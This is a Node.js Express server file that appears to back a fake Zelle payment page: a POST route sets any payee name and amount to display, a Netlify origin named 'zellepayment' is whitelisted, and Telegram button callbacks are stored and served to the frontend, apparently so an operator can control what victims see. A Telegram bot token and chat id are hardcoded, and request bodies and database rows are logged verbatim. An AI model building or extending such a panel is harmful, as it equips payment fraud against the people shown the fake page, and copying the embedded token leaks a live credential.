import express from "express";
import helmet from "helmet";
import cors from "cors";
import morgan from "morgan";
import chalk from "chalk";
import Database from "better-sqlite3";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 5000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8326736472:AAGPqPPtxL5ccruOVGfyhdcCTNkckx2EDZc";

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});

// ───── Middleware ─────
app.use(helmet());
app.use(express.json());

const allowedOrigins = [
  "http://localhost:5173",
  "https://zellepayment.netlify.app",
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        console.warn("🚫 Blocked by CORS:", origin);
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);

app.options("*", cors());

// ───── Logging ─────
app.use(
  morgan((tokens, req, res) => {
    return [
      chalk.cyan(tokens.method(req, res)),
      chalk.yellow(tokens.url(req, res)),
      chalk.green(tokens.status(req, res)),
      chalk.magenta(tokens["response-time"](req, res)),
      "ms",
    ].join(" ");
  })
);

const logRequestData = (req) => {
  console.log(chalk.cyan("\n📩 Incoming Request:"));
  console.log(chalk.yellow("  → URL:"), req.originalUrl);
  console.log(chalk.yellow("  → Method:"), req.method);
  console.log(chalk.yellow("  → Body:"), req.body);
};

// ───── Database ─────
const db = new Database("plaid_demo.db");
db.pragma("journal_mode = WAL");

// override prepare for logging
const originalPrepare = db.prepare.bind(db);
db.prepare = (query) => {
  console.log(chalk.magenta("💾 SQL Query:"), query);
  const stmt = originalPrepare(query);

  ["run", "get", "all"].forEach((method) => {
    if (stmt[method]) {
      const original = stmt[method].bind(stmt);
      stmt[method] = (...args) => {
        console.log(chalk.blue(`🧩 DB Operation: ${method}`), args);
        try {
          const result = original(...args);
          console.log(chalk.green("✅ DB Result:"), result);
          return result;
        } catch (err) {
          console.error(chalk.red("💥 DB Error:"), err);
          throw err;
        }
      };
    }
  });
  return stmt;
};

// Create tables
db.prepare(`
  CREATE TABLE IF NOT EXISTS zelle_payment (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    amount REAL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS telegram_callbacks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    callback_data TEXT,
    username TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`).run();

// ───── Helper: Send to Telegram ─────
async function sendToTelegram(message, buttons = null) {
  try {
    const payload = { chat_id: "734316369", text: message, parse_mode: "HTML" };
    if (buttons) payload.reply_markup = { inline_keyboard: buttons };

    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    const data = await res.json();
    if (!data.ok) console.error("❌ Telegram Error:", data.description);
  } catch (err) {
    console.error("💥 Telegram send error:", err);
  }
}

// ───── Routes ─────

// Get latest Zelle payment
app.get("/api/zelle-payment", (req, res) => {
  try {
    const row = db.prepare("SELECT name, amount FROM zelle_payment ORDER BY id DESC LIMIT 1").get();
    res.json({ payment: row || { name: "James Allen", amount: 167 } });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch Zelle payment" });
  }
});

// Update Zelle payment
app.post("/api/zelle-payment", (req, res) => {
  const { name, amount } = req.body;
  if (!name || typeof amount !== "number") return res.status(400).json({ error: "Invalid name or amount" });

  try {
    db.prepare("INSERT INTO zelle_payment (name, amount) VALUES (?, ?)").run(name, amount);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Failed to update Zelle payment" });
  }
});

// Receive Telegram button callback
app.post("/api/telegram-webhook", express.json(), async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const callbackId = update.callback_query.id;
    const data = update.callback_query.data;
    const user = update.callback_query.from;

    console.log("📩 Telegram Callback:", data, "from:", user.username);

    // store callback in DB
    db.prepare("INSERT INTO telegram_callbacks (callback_data, username) VALUES (?, ?)")
      .run(data, user.username);

    // acknowledge Telegram immediately
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackId }),
    });
  }

  res.sendStatus(200);
});

// Fetch latest Telegram callbacks for frontend
app.get("/api/telegram-callbacks", (req, res) => {
  try {
    const rows = db.prepare("SELECT * FROM telegram_callbacks ORDER BY id DESC LIMIT 20").all();
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch callbacks" });
  }
});

// Health check
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", uptime: process.uptime(), timestamp: new Date().toISOString() });
});
